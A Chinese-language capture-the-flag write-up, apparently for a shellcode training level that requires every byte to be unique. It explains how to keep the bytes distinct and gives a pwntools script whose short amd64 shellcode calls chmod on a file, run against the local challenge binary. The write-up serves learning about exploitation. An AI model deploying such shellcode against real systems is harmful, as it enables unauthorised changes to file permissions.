# 挑战简介
此挑战要求你的 shellcode 中的每个字节都是唯一的！

# 思路
想要字节唯一，你要满足以下几点
- shellcode尽可能短
- 指令不要用重复的形式，学会活用，降位就是一个好方法

所以我们还是套模板，继续chmod

```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-12')

p.recvuntil('Reading 0x1000 bytes from stdin.\n')

shellcode = asm('''
    push 0x66
    mov rdi, rsp
    mov sil, 4
    mov al, 90
    syscall
    ret
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```
